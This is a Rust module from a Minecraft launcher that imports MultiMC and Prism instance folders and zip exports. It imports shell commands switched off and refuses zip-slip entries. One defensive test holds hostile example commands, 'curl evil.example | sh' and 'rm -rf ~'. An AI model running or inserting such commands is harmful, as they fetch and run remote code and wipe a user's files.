//! MultiMC and Prism Launcher instances: `instance.cfg` (a Java properties file), `mmc-pack.json` (the list of
//! components: Minecraft, the loader, extra patches), `patches/`, an icon, and the game folder (`.minecraft/` or
//! `minecraft/`). The same format is written by the exporter, so an export can be imported back.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use serde_json::json;

use crate::install::{self, Job, Progress};
use crate::instances::Instance;
use crate::loaders::Loader;
use crate::model::{Arg, Arguments};
use crate::modrecord::ModRecord;
use crate::packutil;
use crate::paths::Dirs;

// ---------------------------------------------------------------------------------------------------------
// instance.cfg: Java properties

/// A Java `.properties` file, read and written the way `java.util.Properties` does it.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Properties {
    map: BTreeMap<String, String>,
}

impl Properties {
    pub fn parse(text: &str) -> Properties {
        let mut map = BTreeMap::new();
        let mut lines = text.lines().peekable();
        while let Some(raw) = lines.next() {
            let mut line = raw.trim_start().to_string();
            if line.is_empty() || line.starts_with('#') || line.starts_with('!') {
                continue;
            }
            // a line ending in an odd number of backslashes continues on the next one
            while ends_with_odd_backslashes(&line) {
                line.pop();
                match lines.next() {
                    Some(next) => line.push_str(next.trim_start()),
                    None => break,
                }
            }
            let chars: Vec<char> = line.chars().collect();
            let mut i = 0;
            let mut key = String::new();
            while i < chars.len() {
                let c = chars[i];
                if c == '\\' && i + 1 < chars.len() {
                    key.push(chars[i]);
                    key.push(chars[i + 1]);
                    i += 2;
                    continue;
                }
                if c == '=' || c == ':' || c.is_whitespace() {
                    break;
                }
                key.push(c);
                i += 1;
            }
            // skip whitespace, then at most one separator, then whitespace
            while i < chars.len() && chars[i].is_whitespace() {
                i += 1;
            }
            if i < chars.len() && (chars[i] == '=' || chars[i] == ':') {
                i += 1;
            }
            while i < chars.len() && chars[i].is_whitespace() {
                i += 1;
            }
            let value: String = chars[i..].iter().collect();
            map.insert(unescape(&key), unescape(&value));
        }
        Properties { map }
    }

    pub fn get(&self, key: &str) -> Option<&str> {
        self.map.get(key).map(String::as_str)
    }

    /// `get`, trying a few spellings (MultiMC and Prism differ in the case of some keys).
    pub fn get_any(&self, keys: &[&str]) -> Option<&str> {
        keys.iter().find_map(|k| self.get(k))
    }

    pub fn set(&mut self, key: &str, value: impl Into<String>) {
        self.map.insert(key.to_string(), value.into());
    }

    pub fn is_true(&self, key: &str) -> bool {
        self.get(key).is_some_and(|v| v.eq_ignore_ascii_case("true"))
    }

    /// `Properties.store`: a comment, the date, then `key=value` lines. Keys are sorted so the file is stable.
    pub fn store(&self, comment: &str) -> String {
        let mut out = String::new();
        if !comment.is_empty() {
            out.push_str(&format!("#{comment}\n"));
        }
        out.push_str(&format!("#{}\n", chrono::Local::now().format("%a %b %d %H:%M:%S %Z %Y")));
        for (k, v) in &self.map {
            out.push_str(&format!("{}={}\n", escape(k, true), escape(v, false)));
        }
        out
    }
}

fn ends_with_odd_backslashes(s: &str) -> bool {
    s.chars().rev().take_while(|c| *c == '\\').count() % 2 == 1
}

fn unescape(s: &str) -> String {
    let mut out = String::new();
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('f') => out.push('\u{c}'),
            Some('u') => {
                let hex: String = chars.by_ref().take(4).collect();
                match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                    Some(ch) => out.push(ch),
                    None => out.push_str(&format!("\\u{hex}")),
                }
            }
            Some(other) => out.push(other),
            None => {}
        }
    }
    out
}

fn escape(s: &str, is_key: bool) -> String {
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        match c {
            ' ' if is_key || i == 0 => out.push_str("\\ "),
            '\\' => out.push_str("\\\\"),
            '\t' => out.push_str("\\t"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\u{c}' => out.push_str("\\f"),
            '=' | ':' | '#' | '!' => {
                out.push('\\');
                out.push(c);
            }
            c if (c as u32) < 0x20 || (c as u32) > 0x7e => {
                let mut buf = [0u16; 2];
                for unit in c.encode_utf16(&mut buf) {
                    out.push_str(&format!("\\u{:04X}", unit));
                }
            }
            c => out.push(c),
        }
    }
    out
}

// ---------------------------------------------------------------------------------------------------------
// mmc-pack.json and patches

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(default)]
pub struct Require {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub equals: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub suggests: Option<String>,
    pub uid: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(default, rename_all = "camelCase")]
pub struct Component {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cached_name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cached_requires: Option<Vec<Require>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cached_version: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cached_volatile: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dependency_only: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub important: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub disabled: Option<bool>,
    pub uid: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(default, rename_all = "camelCase")]
pub struct Manifest {
    pub components: Vec<Component>,
    pub format_version: i64,
}

/// The components that are not Minecraft, a loader or their plumbing: Java agents and the like.
const STANDARD: [&str; 8] = [
    "net.minecraft",
    "org.quiltmc.quilt-loader",
    "net.fabricmc.fabric-loader",
    "net.neoforged",
    "net.minecraftforge",
    "com.mumfrey.liteloader",
    "net.fabricmc.intermediary",
    "org.lwjgl3",
];

impl Manifest {
    pub fn component(&self, uid: &str) -> Option<&Component> {
        self.components.iter().find(|c| c.uid.eq_ignore_ascii_case(uid))
    }

    pub fn minecraft_version(&self) -> Option<&str> {
        self.component("net.minecraft").and_then(|c| c.version.as_deref())
    }

    /// The loader the instance uses and its version: NeoForge, then Forge, then Fabric, then Quilt (the Java edition's order).
    pub fn loader(&self) -> Option<(Loader, String)> {
        for (uid, loader) in [
            ("net.neoforged", Loader::NeoForge),
            ("net.minecraftforge", Loader::Forge),
            ("net.fabricmc.fabric-loader", Loader::Fabric),
            ("org.quiltmc.quilt-loader", Loader::Quilt),
        ] {
            if let Some(v) = self.component(uid).and_then(|c| c.version.clone()) {
                return Some((loader, v));
            }
        }
        None
    }

    pub fn non_standard_components(&self) -> Vec<&Component> {
        self.components
            .iter()
            .filter(|c| c.disabled != Some(true) && !STANDARD.iter().any(|s| c.uid.eq_ignore_ascii_case(s)))
            .collect()
    }
}

#[derive(Deserialize, Clone, Debug, Default)]
#[serde(default)]
pub struct Agent {
    pub name: String,
    pub url: Option<String>,
}

#[derive(Deserialize, Clone, Debug, Default)]
#[serde(default)]
pub struct Patch {
    pub name: String,
    pub uid: String,
    pub version: String,
    #[serde(rename = "formatVersion")]
    pub format_version: i64,
    #[serde(rename = "+agents")]
    pub agents: Vec<Agent>,
}

/// What `instance.cfg` says that matters to BlockForge.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct InstanceConfig {
    pub name: String,
    pub icon_key: Option<String>,
    pub maximum_memory: Option<u32>,
    pub perm_gen: Option<u32>,
    pub java_path: Option<String>,
    pub java_arguments: Option<String>,
    pub pre_launch_command: Option<String>,
    pub post_exit_command: Option<String>,
    pub wrapper_command: Option<String>,
    /// Prism's switches that say the instance's own memory, Java arguments and Java location are used (`None` when
    /// the file doesn't say, as in older exports: then they are used as before).
    pub override_memory: Option<bool>,
    pub override_java_args: Option<bool>,
    pub override_java_location: Option<bool>,
    /// The instance lets Prism pick the Java (its `JavaPath` is then only the last one it used).
    pub automatic_java: Option<bool>,
}

impl InstanceConfig {
    pub fn from_properties(p: &Properties) -> InstanceConfig {
        let num = |k: &str| p.get(k).and_then(|v| v.trim().parse::<u32>().ok());
        let text = |keys: &[&str]| p.get_any(keys).map(str::to_string);
        InstanceConfig {
            name: p.get("name").unwrap_or("MultiMC Import").to_string(),
            icon_key: text(&["iconKey"]),
            maximum_memory: num("MaxMemAlloc"),
            perm_gen: num("PermGen"),
            java_path: text(&["JavaPath"]),
            // MultiMC writes JvmArgs, the Java edition's exporter JVMArgs; both are read
            java_arguments: text(&["JVMArgs", "JvmArgs"]),
            pre_launch_command: text(&["PreLaunchCommand"]),
            post_exit_command: text(&["PostExitCommand"]),
            wrapper_command: text(&["WrapperCommand"]),
            override_memory: flag(p, "OverrideMemory"),
            override_java_args: flag(p, "OverrideJavaArgs"),
            override_java_location: flag(p, "OverrideJavaLocation"),
            automatic_java: flag(p, "AutomaticJava"),
        }
    }
}

/// A `true`/`false` setting, `None` when it isn't there or is something else.
fn flag(p: &Properties, key: &str) -> Option<bool> {
    match p.get(key)?.trim() {
        v if v.eq_ignore_ascii_case("true") => Some(true),
        v if v.eq_ignore_ascii_case("false") => Some(false),
        _ => None,
    }
}

/// A setting counts only when it holds something ("null" is what MultiMC writes for a command that is not set).
fn usable(v: &Option<String>) -> Option<String> {
    v.as_ref().map(|s| s.trim()).filter(|s| !s.is_empty() && *s != "null").map(str::to_string)
}

/// MultiMC's `JavaPath` points at the java program; BlockForge keeps the folder it lives in (`.../bin/java`
/// becomes `...`).
pub fn java_home_from(path: &str) -> String {
    let p = Path::new(path.trim());
    let file = p.file_name().map(|f| f.to_string_lossy().to_lowercase()).unwrap_or_default();
    if matches!(file.as_str(), "java" | "javaw" | "java.exe" | "javaw.exe") {
        if let Some(bin) = p.parent() {
            if bin.file_name().is_some_and(|n| n == "bin") {
                if let Some(home) = bin.parent() {
                    return home.to_string_lossy().to_string();
                }
            }
        }
    }
    path.trim().to_string()
}

/// An instance folder (or an unzipped export), read.
#[derive(Clone, Debug)]
pub struct MmcInstance {
    pub root: PathBuf,
    pub manifest: Manifest,
    pub config: InstanceConfig,
}

impl MmcInstance {
    pub fn load(root: &Path) -> Result<MmcInstance> {
        let pack = std::fs::read_to_string(root.join("mmc-pack.json")).context("this folder has no mmc-pack.json")?;
        let manifest: Manifest = serde_json::from_str(&pack).context("mmc-pack.json couldn't be read")?;
        let config = match std::fs::read(root.join("instance.cfg")) {
            Ok(bytes) => InstanceConfig::from_properties(&Properties::parse(&String::from_utf8_lossy(&bytes))),
            Err(_) => InstanceConfig { name: "MultiMC Import".into(), ..Default::default() },
        };
        Ok(MmcInstance { root: root.to_path_buf(), manifest, config })
    }

    /// `.minecraft` when there is one, else `minecraft`.
    pub fn game_dir(&self) -> PathBuf {
        if self.root.join(".minecraft").exists() { self.root.join(".minecraft") } else { self.root.join("minecraft") }
    }
}

/// Unzip an export into `dest` (which must be empty or new) and return the folder holding `mmc-pack.json`.
pub fn extract_export(archive: &Path, dest: &Path) -> Result<PathBuf> {
    let file = std::fs::File::open(archive).with_context(|| format!("opening {}", archive.display()))?;
    let mut zip = zip::ZipArchive::new(file).context("that isn't a zip file")?;
    std::fs::create_dir_all(dest)?;
    for i in 0..zip.len() {
        let mut entry = zip.by_index(i)?;
        // entries that climb out of the folder (zip slip) are never written
        let Some(rel) = entry.enclosed_name() else { continue };
        let out = dest.join(&rel);
        if entry.is_dir() {
            std::fs::create_dir_all(&out)?;
            continue;
        }
        if let Some(dir) = out.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let mut f = std::fs::File::create(&out)?;
        std::io::copy(&mut entry, &mut f)?;
    }
    if dest.join("mmc-pack.json").is_file() {
        return Ok(dest.to_path_buf());
    }
    // exactly one folder inside, holding the instance
    let dirs: Vec<PathBuf> = std::fs::read_dir(dest)?.flatten().map(|e| e.path()).collect();
    if dirs.len() == 1 && dirs[0].join("mmc-pack.json").is_file() {
        return Ok(dirs[0].clone());
    }
    bail!("this archive has no mmc-pack.json, so it isn't a MultiMC or Prism export")
}

// ---------------------------------------------------------------------------------------------------------
// Importing

/// What the player can choose when importing.
#[derive(Clone, Debug, Default)]
pub struct ImportOptions {
    /// A name for the new instance; the instance's own name when empty.
    pub name: Option<String>,
}

/// Import an unzipped export or a MultiMC / Prism instance folder as a new instance.
pub async fn import_folder(
    dirs: &Dirs,
    root: &Path,
    opts: &ImportOptions,
    progress: &Arc<Progress>,
) -> Result<Instance> {
    progress.stage("Reading the instance");
    let mmc = MmcInstance::load(root)?;
    if mmc.manifest.format_version != 1 {
        bail!("Cannot install as the format is version {} which I cannot install", mmc.manifest.format_version);
    }
    let mc = mmc.manifest.minecraft_version().context("No net.minecraft component present in manifest")?.to_string();
    let wanted_name = opts.name.clone().filter(|n| !n.trim().is_empty()).unwrap_or_else(|| mmc.config.name.clone());
    let name = packutil::unique_name(&wanted_name, |n| packutil::instance_name_taken(dirs, n));

    let (loader, loader_version, warnings) =
        super::resolve_loader(dirs, &mc, mmc.manifest.loader().map(|(l, v)| (l, Some(v)))).await;
    let mut instance = crate::instances::create(dirs, &name, &mc, loader, loader_version.as_deref(), progress).await?;
    match finish_import(dirs, &mut instance, &mmc, &mc, &name, &warnings, progress).await {
        Ok(()) => Ok(instance),
        Err(e) => {
            let _ = std::fs::remove_dir_all(&instance.root);
            Err(e)
        }
    }
}

async fn finish_import(
    dirs: &Dirs,
    instance: &mut Instance,
    mmc: &MmcInstance,
    mc: &str,
    name: &str,
    warnings: &[String],
    progress: &Arc<Progress>,
) -> Result<()> {
    // the game folder
    progress.stage("Copying the Minecraft folder");
    let game = mmc.game_dir();
    if game.is_dir() {
        packutil::copy_dir_merge(&game, &instance.root)?;
    }

    // the picture
    if let Some(icon) = mmc.config.icon_key.as_deref().filter(|k| !k.is_empty()) {
        let from = mmc.root.join(format!("{icon}.png"));
        if from.is_file() && !icon.contains(['/', '\\']) {
            let _ = std::fs::copy(from, instance.root.join("instance.png"));
        }
    }

    // Java agents from patches
    let agents = agent_libraries(mmc);
    if !agents.is_empty() {
        progress.stage("Downloading Java agents");
        let jobs: Vec<Job> = agents
            .iter()
            .filter(|a| !a.url.is_empty())
            .map(|a| Job::new(&a.url, dirs.libraries.join(&a.path)))
            .collect();
        install::download_all(jobs, progress, false).await?;
        let args = instance.file.version.arguments.get_or_insert_with(Arguments::default);
        for a in &agents {
            args.jvm.push(Arg::Plain(format!("-javaagent:{}", dirs.libraries.join(&a.path).display())));
        }
    }

    // the mods that came with it
    let mut records = Vec::new();
    for (dir, kind) in
        [("mods".to_string(), "mods"), (format!("mods/{mc}"), "dependency"), ("mods/ic2".to_string(), "ic2lib")]
    {
        let Ok(rd) = std::fs::read_dir(instance.root.join(&dir)) else { continue };
        let mut files: Vec<PathBuf> = rd.flatten().map(|e| e.path()).filter(|p| p.is_file()).collect();
        files.sort();
        for p in files {
            let lower = p.to_string_lossy().to_lowercase();
            if !(lower.ends_with(".jar") || lower.ends_with(".zip")) {
                continue;
            }
            let file = p.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default();
            let (n, v, d) = super::detect::mod_metadata(&p);
            let mut rec = ModRecord::new(n.as_deref().unwrap_or(&file), &file, kind);
            rec.version = v.unwrap_or_else(|| "Unknown".into());
            rec.description = d.unwrap_or_default();
            records.push(rec);
        }
    }
    instance.set_mod_records(&records);

    // settings from instance.cfg
    apply_config(&mut instance.file.launcher, &mmc.config, name);
    let l = &mut instance.file.launcher;
    // the manifest is kept, like the Java edition does (the config is not part of it)
    l.extras.insert("multiMCManifest".into(), serde_json::to_value(&mmc.manifest)?);
    for w in warnings {
        eprintln!("[import] {w}");
    }
    instance.save().context("saving instance.json")
}

#[derive(Clone, Debug, PartialEq)]
pub struct AgentLibrary {
    /// Repository path, from the Maven name.
    pub path: String,
    pub url: String,
}

/// The agent jars named by the instance's patches (`+agents`), with where to download them.
pub fn agent_libraries(mmc: &MmcInstance) -> Vec<AgentLibrary> {
    let mut out = Vec::new();
    for c in mmc.manifest.non_standard_components() {
        let patch_file = mmc.root.join("patches").join(format!("{}.json", c.uid));
        let Ok(text) = std::fs::read_to_string(&patch_file) else {
            eprintln!("[import] Could not find patch for {}", c.uid);
            continue;
        };
        let Ok(patch) = serde_json::from_str::<Patch>(&text) else {
            eprintln!("[import] Failed to read patch for {} from {}", c.uid, patch_file.display());
            continue;
        };
        for agent in patch.agents {
            let Some(path) = crate::paths::maven_path(&agent.name) else { continue };
            let url = agent
                .url
                .as_deref()
                .filter(|u| !u.is_empty())
                .map(|u| format!("{}{path}", if u.ends_with('/') { u.to_string() } else { format!("{u}/") }))
                .unwrap_or_default();
            out.push(AgentLibrary { path, url });
        }
    }
    out
}

/// Import an exported zip.
pub async fn import_archive(
    dirs: &Dirs,
    archive: &Path,
    opts: &ImportOptions,
    progress: &Arc<Progress>,
) -> Result<Instance> {
    progress.stage("Unpacking the export");
    let tmp = dirs.temp.join(format!("multimcimport-{}", uuid::Uuid::new_v4().simple()));
    let archive = archive.to_path_buf();
    let tmp2 = tmp.clone();
    let root = tokio::task::spawn_blocking(move || extract_export(&archive, &tmp2)).await??;
    let result = import_folder(dirs, &root, opts, progress).await;
    let _ = std::fs::remove_dir_all(&tmp);
    result
}

/// Read a file in an archive without unpacking the whole thing (used to look at a small manifest).
pub fn read_archive_entry(archive: &Path, name: &str) -> Result<String> {
    let file = std::fs::File::open(archive)?;
    let mut zip = zip::ZipArchive::new(file)?;
    let mut e = zip.by_name(name)?;
    let mut s = String::new();
    e.read_to_string(&mut s)?;
    Ok(s)
}

/// The settings of a MultiMC/Prism `instance.cfg` written into an instance's `launcher` block.
fn apply_config(l: &mut crate::instances::LauncherBlock, cfg: &InstanceConfig, name: &str) {
    l.name = name.to_string();
    l.pack = name.to_string();
    l.description = String::new();
    l.version = "1".into();
    l.vanilla_instance = false;
    // commands run through the shell on every start: ones that came in a file (perhaps downloaded) are kept but
    // switched off, so nothing runs until the player has seen them and switched them on in the instance's settings
    let mut commands = Vec::new();
    if let Some(cmd) = usable(&cfg.pre_launch_command) {
        l.extras.insert("preLaunchCommand".into(), json!(cmd));
        commands.push(cmd);
    }
    if let Some(cmd) = usable(&cfg.post_exit_command) {
        l.extras.insert("postExitCommand".into(), json!(cmd));
        commands.push(cmd);
    }
    if let Some(cmd) = usable(&cfg.wrapper_command) {
        l.wrapper_command = Some(cmd.clone());
        commands.push(cmd);
    }
    if !commands.is_empty() {
        l.extras.insert("enableCommands".into(), json!(false));
        crate::logs::warn(format!(
            "The imported instance {name} has commands ({}); they were imported switched off. Instance settings > \
             Commands switches them on.",
            commands.join("; ")
        ));
    }
    // the instance's own settings count only where it says it uses them, as Prism does
    let used = |switch: Option<bool>| switch != Some(false);
    if used(cfg.override_java_location) && cfg.automatic_java != Some(true) {
        if let Some(p) = usable(&cfg.java_path) {
            l.java_path = Some(java_home_from(&p));
        }
    }
    if used(cfg.override_java_args) {
        if let Some(a) = usable(&cfg.java_arguments) {
            l.java_arguments = Some(a);
        }
    }
    if used(cfg.override_memory) {
        l.perm_gen = cfg.perm_gen;
        l.maximum_memory = cfg.maximum_memory;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // A real `instance.cfg` and `mmc-pack.json` as Prism Launcher 8 writes them.
    const PRISM_CFG: &str = "[General]\nAutomaticJava=true\nConfigVersion=1.2\nInstanceType=OneSix\nJavaPath=/usr/lib/jvm/java-21-openjdk/bin/java\nJvmArgs=-Dfoo=bar -Xss4M\nOverrideCommands=true\nOverrideJavaArgs=true\nOverrideMemory=true\nMaxMemAlloc=6144\nMinMemAlloc=512\nPostExitCommand=echo done\nPreLaunchCommand=\nWrapperCommand=gamemoderun\nglobalSettings=false\niconKey=custom_icon\nname=All the Mods\\: 9\nnotes=\n";
    const PRISM_PACK: &str = r#"{"components":[
        {"cachedName":"LWJGL 3","cachedVersion":"3.3.3","cachedVolatile":true,"dependencyOnly":true,"uid":"org.lwjgl3","version":"3.3.3"},
        {"cachedName":"Minecraft","cachedRequires":[{"equals":"3.3.3","suggests":"3.3.3","uid":"org.lwjgl3"}],"cachedVersion":"1.20.1","important":true,"uid":"net.minecraft","version":"1.20.1"},
        {"cachedName":"Forge","cachedRequires":[{"equals":"1.20.1","uid":"net.minecraft"}],"cachedVersion":"47.2.0","uid":"net.minecraftforge","version":"47.2.0"},
        {"cachedName":"My Agent","uid":"io.example.agent","version":"1"}],"formatVersion":1}"#;

    #[test]
    fn properties_read_like_javas() {
        let p = Properties::parse(PRISM_CFG);
        assert_eq!(p.get("name"), Some("All the Mods: 9"));
        assert_eq!(p.get("MaxMemAlloc"), Some("6144"));
        assert_eq!(p.get("PreLaunchCommand"), Some(""));
        assert!(p.is_true("OverrideMemory"));
        assert_eq!(p.get("[General]"), Some(""), "a section header is just a key, as in Java");
        let q = Properties::parse("# comment\n! other\na : b\nc\\ d=e\\\n   continued\nunicode=caf\\u00E9\nempty\n");
        assert_eq!(q.get("a"), Some("b"));
        assert_eq!(q.get("c d"), Some("econtinued"));
        assert_eq!(q.get("unicode"), Some("café"));
        assert_eq!(q.get("empty"), Some(""));
    }

    #[test]
    fn properties_write_what_java_would() {
        let mut p = Properties::default();
        p.set("name", "Café: Pack #1");
        p.set("JavaPath", "C:\\Java\\bin\\javaw.exe");
        p.set("empty", "");
        p.set("my key", " lead");
        let text = p.store("Exported by BlockForge");
        assert!(text.starts_with("#Exported by BlockForge\n#"));
        assert!(text.contains("name=Caf\\u00E9\\: Pack \\#1\n"));
        assert!(text.contains("JavaPath=C\\:\\\\Java\\\\bin\\\\javaw.exe\n"));
        assert!(text.contains("empty=\n"));
        assert!(text.contains("my\\ key=\\ lead\n"));
        let back = Properties::parse(&text);
        assert_eq!(back.get("name"), Some("Café: Pack #1"));
        assert_eq!(back.get("JavaPath"), Some("C:\\Java\\bin\\javaw.exe"));
        assert_eq!(back.get("my key"), Some(" lead"));
    }

    #[test]
    fn manifest_gives_minecraft_and_loader() {
        let m: Manifest = serde_json::from_str(PRISM_PACK).unwrap();
        assert_eq!(m.format_version, 1);
        assert_eq!(m.minecraft_version(), Some("1.20.1"));
        assert_eq!(m.loader(), Some((Loader::Forge, "47.2.0".to_string())));
        let extra: Vec<&str> = m.non_standard_components().iter().map(|c| c.uid.as_str()).collect();
        assert_eq!(extra, vec!["io.example.agent"]);
        // written back in the field order the Java edition uses, without nulls
        let back = serde_json::to_string(&m.components[1]).unwrap();
        assert!(back.starts_with(r#"{"cachedName":"Minecraft","cachedRequires":[{"equals":"3.3.3","suggests":"3.3.3","uid":"org.lwjgl3"}],"cachedVersion":"1.20.1","important":true,"uid":"#));
        let both: Manifest = serde_json::from_str(r#"{"components":[{"uid":"net.minecraft","version":"1.21"},{"uid":"net.fabricmc.fabric-loader","version":"0.16"},{"uid":"net.neoforged","version":"21.1.1"}]}"#).unwrap();
        assert_eq!(both.loader(), Some((Loader::NeoForge, "21.1.1".to_string())), "NeoForge wins like in Java");
        let vanilla: Manifest =
            serde_json::from_str(r#"{"components":[{"uid":"net.minecraft","version":"1.21"}],"formatVersion":1}"#)
                .unwrap();
        assert_eq!(vanilla.loader(), None);
    }

    #[test]
    fn instance_config_reads_prism_and_java_spellings() {
        let c = InstanceConfig::from_properties(&Properties::parse(PRISM_CFG));
        assert_eq!(c.name, "All the Mods: 9");
        assert_eq!(c.maximum_memory, Some(6144));
        assert_eq!(c.java_arguments.as_deref(), Some("-Dfoo=bar -Xss4M"));
        assert_eq!(c.icon_key.as_deref(), Some("custom_icon"));
        assert_eq!(usable(&c.pre_launch_command), None);
        assert_eq!(usable(&c.post_exit_command).as_deref(), Some("echo done"));
        let java_style = InstanceConfig::from_properties(&Properties::parse(
            "JVMArgs=-Xmx1G\nPermGen=256\nMaxMemAlloc=oops\nPostExitCommand=null\n",
        ));
        assert_eq!(java_style.java_arguments.as_deref(), Some("-Xmx1G"));
        assert_eq!(java_style.perm_gen, Some(256));
        assert_eq!(java_style.maximum_memory, None);
        assert_eq!(usable(&java_style.post_exit_command), None);
        assert_eq!(InstanceConfig::from_properties(&Properties::default()).name, "MultiMC Import");
    }

    #[test]
    fn java_paths_become_homes() {
        assert_eq!(java_home_from("/usr/lib/jvm/java-21-openjdk/bin/java"), "/usr/lib/jvm/java-21-openjdk");
        assert_eq!(java_home_from("/opt/jdk/bin/javaw.exe"), "/opt/jdk");
        assert_eq!(java_home_from("/opt/jdk"), "/opt/jdk");
    }

    fn sample_folder() -> PathBuf {
        let d = std::env::temp_dir().join(format!("bf-mmc-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(d.join(".minecraft/mods")).unwrap();
        std::fs::create_dir_all(d.join("patches")).unwrap();
        std::fs::write(d.join("instance.cfg"), PRISM_CFG).unwrap();
        std::fs::write(d.join("mmc-pack.json"), PRISM_PACK).unwrap();
        std::fs::write(d.join("custom_icon.png"), b"png").unwrap();
        std::fs::write(
            d.join("patches/io.example.agent.json"),
            r#"{"formatVersion":1,"name":"My Agent","uid":"io.example.agent","version":"1","+agents":[{"name":"io.example:agent:1.0","url":"https://maven.example.com/repo"}]}"#,
        )
        .unwrap();
        d
    }

    #[test]
    fn a_folder_is_read_with_its_game_dir_and_agents() {
        let d = sample_folder();
        let m = MmcInstance::load(&d).unwrap();
        assert_eq!(m.config.name, "All the Mods: 9");
        assert_eq!(m.game_dir(), d.join(".minecraft"));
        assert_eq!(
            agent_libraries(&m),
            vec![AgentLibrary {
                path: "io/example/agent/1.0/agent-1.0.jar".into(),
                url: "https://maven.example.com/repo/io/example/agent/1.0/agent-1.0.jar".into()
            }]
        );
        std::fs::remove_dir_all(d.join(".minecraft")).unwrap();
        assert_eq!(m.game_dir(), d.join("minecraft"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn archives_unpack_with_or_without_a_top_folder_and_refuse_zip_slip() {
        use std::io::Write;
        let tmp = std::env::temp_dir().join(format!("bf-mmc-zip-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&tmp).unwrap();
        let make = |name: &str, entries: &[(&str, &str)]| {
            let path = tmp.join(name);
            let mut z = zip::ZipWriter::new(std::fs::File::create(&path).unwrap());
            for (n, c) in entries {
                z.start_file(*n, zip::write::SimpleFileOptions::default()).unwrap();
                z.write_all(c.as_bytes()).unwrap();
            }
            z.finish().unwrap();
            path
        };
        let flat = make(
            "flat.zip",
            &[("mmc-pack.json", PRISM_PACK), ("instance.cfg", PRISM_CFG), (".minecraft/options.txt", "fov:90")],
        );
        let out = tmp.join("out-flat");
        assert_eq!(extract_export(&flat, &out).unwrap(), out);
        assert!(out.join(".minecraft/options.txt").is_file());
        let nested = make("nested.zip", &[("My Pack/mmc-pack.json", PRISM_PACK), ("My Pack/instance.cfg", PRISM_CFG)]);
        let out2 = tmp.join("out-nested");
        assert_eq!(extract_export(&nested, &out2).unwrap(), out2.join("My Pack"));
        let evil = make("evil.zip", &[("mmc-pack.json", PRISM_PACK), ("../escaped.txt", "x")]);
        extract_export(&evil, &tmp.join("out-evil")).unwrap();
        assert!(!tmp.join("escaped.txt").exists());
        let none = make("none.zip", &[("readme.txt", "hi")]);
        assert!(extract_export(&none, &tmp.join("out-none")).is_err());
        let _ = std::fs::remove_dir_all(&tmp);
    }
}

#[cfg(test)]
mod config_tests {
    use super::*;

    fn cfg(text: &str) -> InstanceConfig {
        InstanceConfig::from_properties(&Properties::parse(text))
    }

    #[test]
    fn commands_from_an_imported_instance_are_never_switched_on_by_themselves() {
        let c = cfg(
            "[General]\nOverrideCommands=true\nPreLaunchCommand=curl evil.example | sh\nWrapperCommand=gamemoderun\nPostExitCommand=rm -rf ~\n",
        );
        let mut l = crate::instances::LauncherBlock::default();
        apply_config(&mut l, &c, "Shared Pack");
        assert_eq!(l.extras["enableCommands"], json!(false));
        assert_eq!(l.extras["preLaunchCommand"], json!("curl evil.example | sh"), "kept, so the player can see it");
        assert_eq!(l.wrapper_command.as_deref(), Some("gamemoderun"));
        // no commands: nothing about commands is written
        let mut l = crate::instances::LauncherBlock::default();
        apply_config(&mut l, &cfg("[General]\nPreLaunchCommand=null\n"), "x");
        assert!(l.extras.get("enableCommands").is_none());
    }

    #[test]
    fn prisms_override_switches_are_respected() {
        let off = cfg(
            "[General]\nOverrideMemory=false\nMaxMemAlloc=1024\nOverrideJavaArgs=false\nJvmArgs=-Xss1M\nOverrideJavaLocation=false\nJavaPath=/opt/java/bin/java\n",
        );
        let mut l = crate::instances::LauncherBlock::default();
        apply_config(&mut l, &off, "x");
        assert_eq!(l.maximum_memory, None, "the launcher's own memory setting is used");
        assert_eq!(l.java_arguments, None);
        assert_eq!(l.java_path, None);
        // automatic Java: the path is only the last one Prism used, often from another computer
        let auto =
            cfg("[General]\nAutomaticJava=true\nJavaPath=/usr/lib/jvm/java-21/bin/java\nOverrideJavaLocation=true\n");
        let mut l = crate::instances::LauncherBlock::default();
        apply_config(&mut l, &auto, "x");
        assert_eq!(l.java_path, None);
        // older exports without the switches keep working as before
        let old = cfg("[General]\nMaxMemAlloc=6144\nJVMArgs=-Dfoo=bar\n");
        let mut l = crate::instances::LauncherBlock::default();
        apply_config(&mut l, &old, "x");
        assert_eq!(l.maximum_memory, Some(6144));
        assert_eq!(l.java_arguments.as_deref(), Some("-Dfoo=bar"));
    }
}
